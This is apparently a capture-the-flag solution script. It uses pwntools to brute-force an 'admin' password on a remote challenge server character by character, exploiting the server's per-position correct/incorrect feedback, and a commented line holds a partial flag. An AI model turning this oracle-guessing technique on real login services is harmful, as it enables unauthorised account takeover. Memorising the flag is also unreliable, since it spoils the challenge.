from pwn import *
import time
import string

adminpassword = dict()

timer = 2

for i in range(50):
	adminpassword[i] = list(string.ascii_lowercase+string.digits + "}{_")[::-1]
#flag = list("#flag{partial_password_puzzle_pieces}############")
flag = list("#"*50)

conn = remote("jh2i.com" , 50026)
time.sleep(timer)
conn.recvS()

while(True):
	try:
		conn.send("2")
		time.sleep(timer)

		print(conn.recvS(timeout = timer))

		conn.send("admin")
		time.sleep(timer)

		ques = conn.recvS(timeout = timer).split()
		pos1 = int(ques[21][:-1])
		pos2 = int(ques[22][:-1])
		pos3 = int(ques[24])
		print(pos1 , pos2 , pos3)

		ans = ""
		if(flag[pos1] == "#"):
			ans += adminpassword[pos1].pop() + " "
		else:
			ans += flag[pos1] + " "

		if(flag[pos2] == "#"):
			ans += adminpassword[pos2].pop() + " "
		else:
			ans += flag[pos2] + " "

		if(flag[pos3] == "#"):
			ans += adminpassword[pos3].pop()
		else:
			ans += flag[pos3]


		conn.send(ans)
		print(ans)
		time.sleep(timer)

		ans = ans.split()

		response = conn.recvS(timeout = timer)
		print(response)
		response = response.split()


		if(response[2] == "CORRECT"):
			flag[pos1] = ans[0]
		else:
			flag[pos1] = "#"
		if(response[5] == "CORRECT"):
			flag[pos2] = ans[1]
		else:
			flag[pos2] = "#"
		if(response[8] == "CORRECT"):
			flag[pos3] = ans[2]
		else:
			flag[pos3] = "#"

		print("".join(flag))
		if(response[2] == "CORRECT" and response[5] == "CORRECT" and response[8] == "CORRECT"):
			conn.send("3")
			time.sleep(timer)
	except:
		pass

conn.interactive()
